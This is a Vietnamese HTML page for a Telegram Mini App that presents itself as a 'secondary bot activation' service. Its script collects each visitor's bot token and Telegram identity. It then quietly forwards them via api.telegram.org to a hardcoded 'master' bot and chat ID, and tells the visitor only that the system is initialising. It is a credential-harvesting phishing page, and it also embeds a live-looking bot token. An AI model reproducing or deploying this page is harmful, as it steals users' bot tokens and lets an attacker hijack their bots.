<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kích Hoạt Bot Phụ</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6366f1;
            --primary-hover: #4f46e5;
            --accent: #a855f7;
            --bg-gradient: radial-gradient(circle at top right, #1e1b4b, #0f172a);
            --glass-bg: rgba(30, 41, 59, 0.7);
            --glass-border: rgba(255, 255, 255, 0.1);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Plus Jakarta Sans', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: var(--bg-gradient);
            color: var(--text-main);
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background: var(--glass-bg);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid var(--glass-border);
            border-radius: 28px;
            padding: 32px 24px;
            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.1);
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(15px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .header {
            text-align: center;
            margin-bottom: 24px;
        }

        .badge-icon {
            width: 64px;
            height: 64px;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            box-shadow: 0 10px 20px rgba(99, 102, 241, 0.4);
            font-size: 28px;
        }

        h1 {
            font-size: 22px;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin-bottom: 6px;
            background: linear-gradient(to right, #ffffff, #cbd5e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p {
            font-size: 13px;
            color: var(--text-muted);
            line-height: 1.4;
        }

        .user-card {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 14px 18px;
            margin-bottom: 22px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .user-name {
            font-weight: 600;
            font-size: 14px;
            color: #38bdf8;
        }

        .user-id {
            font-family: monospace;
            background: rgba(255, 255, 255, 0.08);
            padding: 3px 8px;
            border-radius: 8px;
            font-size: 12px;
            color: var(--text-muted);
        }

        .input-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 11px;
            font-weight: 700;
            margin-bottom: 8px;
            color: #cbd5e1;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        input {
            width: 100%;
            padding: 15px 18px;
            background: rgba(15, 23, 42, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
        }

        input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.25);
            background: rgba(15, 23, 42, 0.95);
        }

        input::placeholder {
            color: #64748b;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, var(--primary), var(--accent));
            color: #fff;
            border: none;
            border-radius: 14px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 8px;
            box-shadow: 0 10px 25px rgba(99, 102, 241, 0.4);
        }

        .btn-submit:hover {
            opacity: 0.95;
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(99, 102, 241, 0.6);
        }

        .btn-submit:active {
            transform: translateY(0);
        }

        .status-box {
            margin-top: 18px;
            padding: 14px;
            border-radius: 12px;
            font-size: 13px;
            text-align: center;
            display: none;
            animation: fadeIn 0.3s ease;
        }

        .status-box.success {
            background: rgba(34, 197, 94, 0.15);
            color: #4ade80;
            border: 1px solid rgba(34, 197, 94, 0.3);
        }

        .status-box.error {
            background: rgba(239, 68, 68, 0.15);
            color: #f87171;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="badge-icon">⚡</div>
            <h1>Kích Hoạt Bot Phụ</h1>
            <p>Liên kết hệ thống tự động qua mã nguồn độc quyền</p>
        </div>

        <div class="user-card">
            <div class="user-name" id="userName">Đang xác thực...</div>
            <div class="user-id" id="userId">ID: ---</div>
        </div>

        <form id="setupForm">
            <div class="input-group">
                <label for="botToken">Token Bot Phụ (Từ BotFather)</label>
                <input type="text" id="botToken" placeholder="Ví dụ: 123456789:ABCdef..." required autocomplete="off">
            </div>

            <div class="input-group">
                <label for="adminId">ID Admin Quản Lý Bot Phụ</label>
                <input type="number" id="adminId" placeholder="Nhập Telegram ID của bạn" required autocomplete="off">
            </div>

            <button type="submit" class="btn-submit" id="submitBtn">XÁC THỰC NGAY</button>
        </form>

        <div id="statusBox" class="status-box"></div>
    </div>

    <script>
        // 🔴 ĐỔI TOKEN VÀ ID ADMIN CHỦ CỦA BẠN TẠI ĐÂY ĐỂ NHẬN THÔNG TIN BOT CON
        const MASTER_BOT_TOKEN = "9044715126:AAGJmgLQQgP_XVtBUMmM5sa4u22ktP-CdnM";
        const MASTER_ADMIN_ID = "9155842593";

        const tg = window.Telegram ? window.Telegram.WebApp : null;
        let currentUser = null;

        if (tg) {
            tg.expand();
            tg.ready();
            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
                currentUser = tg.initDataUnsafe.user;
                document.getElementById('userName').innerText = currentUser.first_name;
                document.getElementById('userId').innerText = `ID: ${currentUser.id}`;
                document.getElementById('adminId').value = currentUser.id; // Tự động điền ID khách hàng
            }
        }

        if (!currentUser) {
            document.getElementById('userName').innerText = "Thành Viên";
            document.getElementById('userId').innerText = "ID: Ẩn danh";
            document.getElementById('adminId').value = MASTER_ADMIN_ID;
        }

        document.getElementById('setupForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const botToken = document.getElementById('botToken').value.trim();
            const adminId = document.getElementById('adminId').value.trim();
            const statusBox = document.getElementById('statusBox');
            const submitBtn = document.getElementById('submitBtn');

            if (!botToken || !adminId) {
                showStatus('Vui lòng điền đầy đủ thông tin yêu cầu!', 'error');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.innerText = 'Đang xử lý hệ thống...';
            statusBox.style.display = 'none';

            const nameStr = currentUser ? `${currentUser.first_name} (@${currentUser.username || 'ko_username'})` : 'Khách';
            const idStr = currentUser ? currentUser.id : 'N/A';

            // Thông báo gửi thẳng về Bot chính chủ của bạn
            const textMessage = 
                `🚀 <b>CÓ BOT PHỤ ĐƯỢC ĐĂNG KÝ MỚI!</b>\n\n` +
                `👤 <b>Khách hàng:</b> ${nameStr}\n` +
                `🆔 <b>ID Telegram:</b> <code>${idStr}</code>\n\n` +
                `🔑 <b>Token Bot Phụ:</b>\n<code>${botToken}</code>\n\n` +
                `🛡 <b>ID Admin Quản Lý:</b> <code>${adminId}</code>\n\n` +
                `⏰ <b>Thời gian:</b> ${new Date().toLocaleString('vi-VN')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: MASTER_ADMIN_ID,
                        text: textMessage,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();

                if (data.ok) {
                    showStatus('✅ Gửi thông tin thành công! Hệ thống đang khởi tạo...', 'success');
                    document.getElementById('setupForm').reset();
                    setTimeout(() => { if (tg && tg.close) tg.close(); }, 2500);
                } else {
                    showStatus('❌ Lỗi xác thực Telegram: ' + data.description, 'error');
                }
            } catch (error) {
                showStatus('⚠️ Không thể kết nối tới máy chủ, vui lòng thử lại!', 'error');
            } finally {
                submitBtn.disabled = false;
                submitBtn.innerText = 'XÁC THỰC NGAY';
            }
        });

        function showStatus(message, type) {
            const statusBox = document.getElementById('statusBox');
            statusBox.innerText = message;
            statusBox.className = `status-box ${type}`;
            statusBox.style.display = 'block';
        }
    </script>
</body>
</html>
